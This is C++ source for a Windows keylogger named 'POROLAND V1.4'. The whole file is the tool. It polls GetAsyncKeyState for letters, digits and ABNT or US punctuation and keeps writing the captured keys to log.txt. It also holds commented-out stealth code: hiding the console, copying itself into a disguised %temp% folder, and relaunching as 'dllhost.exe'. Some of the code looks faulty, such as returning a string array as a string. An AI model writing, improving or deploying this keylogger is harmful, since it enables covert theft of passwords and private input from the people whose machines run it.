//-----------------------------------------------------
//
//                 POROLAND V1.4
//
//-----------------------------------------------------
#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <thread>

using namespace std;
ofstream arq;

class StringMemory{
public:
    void addMemory(string m){
        if(cont>=50)cont=0;
        memory[cont] += m;
        cont++;
    }
    string getMemory(){
        return memory;
    }
private:
    string memory [50];
    int cont=1;
};

bool firstTime(char *argv[]);
void writeLog(StringMemory *cache);
void captureKey(StringMemory *cache);

int main(int argc, char *argv[]){

    //FreeConsole(); // Hide console

    //if(firstTime(argv)==1){
        StringMemory* cache = new StringMemory;
        thread t1(captureKey, cache);
        thread t2(writeLog, cache);
        t1.join();
        t2.join();
    //}
    return 0;
}

bool firstTime(char *argv[]){
    if(strncmp(argv[0],"C:\\", 3)!=0){
        char path[100];
        sprintf( path, "copy /y \"%s\" \"%%temp%%\\237Y6B11-98AH-4A7D-AEF7-P045A1CA2Z6N\" ", argv[0]);
        system("mkdir %temp%\\237Y6B11-98AH-4A7D-AEF7-P045A1CA2Z6N\\");
        system(path);
        //system("start %temp%\\237Y6B11-98AH-4A7D-AEF7-P045A1CA2Z6N\\dllhost.exe");
        return 0;
    }
    return 1;
}

void writeLog(StringMemory* cache){
    while(1){
        arq.open ("log.txt");
        if((cache->getMemory())!="0")arq << cache->getMemory();
        arq.close();
        Sleep(75);
    }
}

void captureKey(StringMemory* cache){
    string keys;
    while(1){
        if(GetAsyncKeyState(0x30)||GetAsyncKeyState(0x60)){keys+="0";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x31)||GetAsyncKeyState(0x61)){keys+="1";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x32)||GetAsyncKeyState(0x62)){keys+="2";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x33)||GetAsyncKeyState(0x63)){keys+="3";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x34)||GetAsyncKeyState(0x64)){keys+="4";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x35)||GetAsyncKeyState(0x65)){keys+="5";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x36)||GetAsyncKeyState(0x66)){keys+="6";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x37)||GetAsyncKeyState(0x67)){keys+="7";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x38)||GetAsyncKeyState(0x68)){keys+="8";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x39)||GetAsyncKeyState(0x69)){keys+="9";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x41)){keys+="a";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x42)){keys+="b";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x43)){keys+="c";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x44)){keys+="d";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x45)){keys+="e";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x46)){keys+="f";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x47)){keys+="g";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x48)){keys+="h";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x49)){keys+="i";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x4A)){keys+="j";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x4B)){keys+="k";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x4C)){keys+="l";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x4D)){keys+="m";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x4E)){keys+="n";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x4F)){keys+="o";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x50)){keys+="p";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x51)){keys+="q";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x52)){keys+="r";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x53)){keys+="s";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x54)){keys+="t";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x55)){keys+="u";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x56)){keys+="v";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x57)){keys+="w";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x58)){keys+="x";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x59)){keys+="y";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x5A)){keys+="z";cache->addMemory(keys);}

        /* //FOR US KEYBOARD
        if(GetAsyncKeyState(0x6A)){keys+="*";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x20)){keys+=" ";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x0D)){keys+=" | ";cache->addMemory(keys);}
        if(GetAsyncKeyState(0xBA)){keys+=";(or:)";cache->addMemory(keys);}
        if(GetAsyncKeyState(0xBB)){keys+="=(or+or§)";cache->addMemory(keys);}
        if(GetAsyncKeyState(0xBC)){keys+=",(or<)";cache->addMemory(keys);}
        if(GetAsyncKeyState(0xBE)){keys+=".(or>)";cache->addMemory(keys);}
        if(GetAsyncKeyState(0xBD)){keys+="-(or_)";cache->addMemory(keys);}
        if(GetAsyncKeyState(0xBF)){keys+="/(or?)";cache->addMemory(keys);}
        if(GetAsyncKeyState(0xC0)){keys+="`(or~)";cache->addMemory(keys);}
        if(GetAsyncKeyState(0xDB)){keys+="´(or`)";cache->addMemory(keys);}
        if(GetAsyncKeyState(0xDC)){keys+="\(or|)";cache->addMemory(keys);}
        if(GetAsyncKeyState(0xDD)){keys+="](or})";cache->addMemory(keys);}
        if(GetAsyncKeyState(0xDE)){keys+="'(or\")";cache->addMemory(keys);}
        if(GetAsyncKeyState(0xBD)){keys+="-(or_)";cache->addMemory(keys);}
        if(GetAsyncKeyState(0xBB)){keys+="=(or+or§)";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x14)){keys+="[CAPS]";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x08)){keys+="[BACKSPACE]";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x09)){keys+="[TAB]";cache->addMemory(keys);}
        if(GetAsyncKeyState(0xA0)||GetAsyncKeyState(0xA1)){keys+="[SHIFT]";cache->addMemory(keys);}*/

        // FOR ABNT KEYBOARD
        if(GetAsyncKeyState(0x6A)){keys+="*";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x20)){keys+=" ";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x0D)){keys+=" | ";cache->addMemory(keys);}
        if(GetAsyncKeyState(0xBA)){keys+="c(decilha)";cache->addMemory(keys);}
        if(GetAsyncKeyState(0xBB)){keys+="=(or+or§)";cache->addMemory(keys);}
        if(GetAsyncKeyState(0xBC)){keys+=",(or<)";cache->addMemory(keys);}
        if(GetAsyncKeyState(0xBE)){keys+=".(or>)";cache->addMemory(keys);}
        if(GetAsyncKeyState(0xBD)){keys+="-(or_)";cache->addMemory(keys);}
        if(GetAsyncKeyState(0xBF)){keys+=";(or:)";cache->addMemory(keys);}
        if(GetAsyncKeyState(0xC0)){keys+="'(or\")";cache->addMemory(keys);}
        if(GetAsyncKeyState(0xC1)){keys+="/(or?)";cache->addMemory(keys);}
        if(GetAsyncKeyState(0xDB)){keys+="´(or`)";cache->addMemory(keys);}
        if(GetAsyncKeyState(0xDC)){keys+="](or})";cache->addMemory(keys);}
        if(GetAsyncKeyState(0xDD)){keys+="[(or{)";cache->addMemory(keys);}
        if(GetAsyncKeyState(0xDE)){keys+="~(or^)";cache->addMemory(keys);}
        if(GetAsyncKeyState(0xBD)){keys+="-(or_)";cache->addMemory(keys);}
        if(GetAsyncKeyState(0xBB)){keys+="=(or+or§)";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x14)){keys+="[CAPS]";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x08)){keys+="[BACKSPACE]";cache->addMemory(keys);}
        if(GetAsyncKeyState(0x09)){keys+="[TAB]";cache->addMemory(keys);}
        if(GetAsyncKeyState(0xA0)||GetAsyncKeyState(0xA1)){keys+="[SHIFT]";cache->addMemory(keys);}

        Sleep(150);
    }
}
